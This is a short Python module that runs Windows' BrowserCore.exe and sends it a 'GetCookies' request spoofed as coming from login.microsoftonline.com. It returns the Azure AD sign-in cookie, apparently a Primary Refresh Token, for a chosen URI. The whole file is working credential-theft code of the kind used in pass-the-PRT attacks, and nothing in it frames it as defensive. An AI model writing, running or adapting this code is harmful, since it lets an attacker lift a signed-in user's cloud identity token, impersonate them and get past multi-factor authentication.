import subprocess
import struct
import json


class PRTGenerator():
    def generate_PRT(self, uri):
        try:
            process = subprocess.Popen([r"C:\Program Files\Windows Security\BrowserCore\browsercore.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            inv = {}
            inv['method'] = 'GetCookies'
            inv['sender'] = "https://login.microsoftonline.com"
            inv['uri'] = uri
            text = json.dumps(inv).encode('utf-8')
            encoded_length = struct.pack('=I', len(text))
            json_result = (process.communicate(input=encoded_length + text)[0]).decode('ISO-8859-1')[4:]
            result = json.loads(json_result)["response"][0]["data"]
            return result
        except:
            return "CHANGE THE URI IN THE MAIN PY CODE IN DUMMY URL"